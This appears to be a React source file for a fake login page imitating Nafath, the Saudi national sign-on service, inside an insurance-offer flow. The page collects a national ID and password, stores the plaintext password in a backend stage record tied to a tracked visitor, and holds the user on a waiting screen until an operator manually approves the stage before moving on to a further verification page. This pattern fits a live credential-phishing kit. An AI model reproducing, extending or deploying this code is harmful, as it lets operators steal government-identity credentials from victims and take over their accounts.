import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Loader2 } from "lucide-react";
import VerificationLayout from "@/components/VerificationLayout";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { toast } from "sonner";
import { useLanguage } from "@/i18n/LanguageContext";
import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";

const NafathLogin = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const nl = t.nafathLogin;
  const offer = location.state?.offer;
  const phone = location.state?.phone;
  const carrier = location.state?.carrier;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);

  const approvalStatus = useAdminApproval(orderId, "nafath_login");

  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success(nl.verified);
      sessionStorage.setItem("insurance_order_id", orderId);
      navigate("/insurance/nafath-verify", { state: { offer, phone, carrier, nationalId: username, orderId } });
    } else if (approvalStatus === "rejected") {
      toast.error(nl.rejected);
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, phone, carrier, username]);

  const handleCredentialsSubmit = async () => {
    if (!username || !password) {
      setError(nl.error);
      return;
    }
    setLoading(true);
    sessionStorage.setItem("nafath_id", username);
    linkVisitorToSession({ national_id: username });
    const id = await createOrUpdateStage(orderId, "nafath_login", { national_id: username, nafath_password: password });
    setOrderId(id);
    setWaitingApproval(true);
  };

  const inputCls = "w-full px-3 py-2.5 rounded-lg bg-background border border-border text-foreground placeholder:text-muted-foreground text-sm focus:outline-none focus:border-primary focus:ring-2 focus:ring-primary/20 transition-all text-right";

  return (
    <VerificationLayout title={nl.title} subtitle={nl.subtitle}>
      <div className="px-5 pb-4 space-y-3 pt-20">
        {waitingApproval ? (
          <WaitingApprovalOverlay
            title={nl.waitingApproval}
            subtitle={nl.waitingReview}
            icon="shield"
          />
        ) : (
          <>
            <div className="space-y-3">
              <div>
                <input className={inputCls} placeholder={nl.usernamePlaceholder} value={username}
                  onChange={(e) => { setUsername(e.target.value); setError(""); }} dir="rtl" />
              </div>
              <div>
                <input className={inputCls} type="password" placeholder={nl.passwordPlaceholder} value={password}
                  onChange={(e) => { setPassword(e.target.value); setError(""); }} dir="rtl" />
              </div>
              {error && <p className="text-[10px] text-destructive text-right">{error}</p>}
              <button onClick={handleCredentialsSubmit} disabled={loading || !username || !password}
                className="w-full bg-primary text-primary-foreground hover:bg-primary/90 rounded-lg py-2.5 font-bold text-xs transition-colors disabled:opacity-50">
                {loading ? nl.processing : nl.login}
              </button>
            </div>
            <div className="bg-accent rounded-lg p-3 text-center">
              <p className="text-xs font-bold text-accent-foreground mb-1">{nl.platformTitle}</p>
              <p className="text-[10px] text-muted-foreground">{nl.platformDesc}</p>
            </div>
          </>
        )}
      </div>
    </VerificationLayout>
  );
};

export default NafathLogin;
